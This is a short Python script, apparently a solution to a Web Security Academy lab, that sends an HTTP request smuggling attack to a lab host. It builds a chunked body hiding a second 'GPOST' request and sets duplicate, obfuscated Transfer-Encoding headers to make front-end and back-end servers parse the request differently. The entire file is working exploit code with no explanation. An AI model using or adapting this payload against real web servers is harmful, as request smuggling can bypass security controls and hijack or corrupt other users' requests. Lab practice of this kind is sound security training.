import http.client

host = '0ad5003f034337cc82f6ddcc00bd00f3.web-security-academy.net'
port = 443

connection = http.client.HTTPSConnection(host, port)

payload = """5c\r
GPOST / HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r\n\r
x=1\r
0\r\n\r\n"""

payload2 = "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '4',
    'Transfer-Encoding': 'chunked',
    'Transfer-encoding': 'cow'
}

connection.request('POST', '/', body=payload2, headers=headers)

response = connection.getresponse()

data = response.read()

connection.close()


